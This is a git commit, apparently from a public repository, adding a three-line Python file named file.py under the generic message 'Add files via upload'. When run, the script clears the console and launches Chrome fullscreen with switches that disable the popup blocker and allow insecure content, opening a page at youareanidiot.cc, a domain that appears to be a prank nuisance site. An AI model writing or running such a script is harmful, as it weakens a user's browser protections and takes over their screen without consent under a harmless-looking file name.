bb754fc3d41e5f319f361f5f25b046a38293688d
Opal <C92i747A@pm.me>
2022-11-13 12:04:24 +0000

    Add files via upload

---
+++ file.py
@@ -0,0 +1,3 @@
+import os as o
+o.system('cls')
+o.system('cmd /c "start chrome /disable-popup-blocking /allow-unsecure-dlls /allow-running-insecure-content /purge-optimization-guide-store /start-fullscreen /enable-exclusive-audio https://youareanidiot.cc/') # Refer to 'about' chromium switches
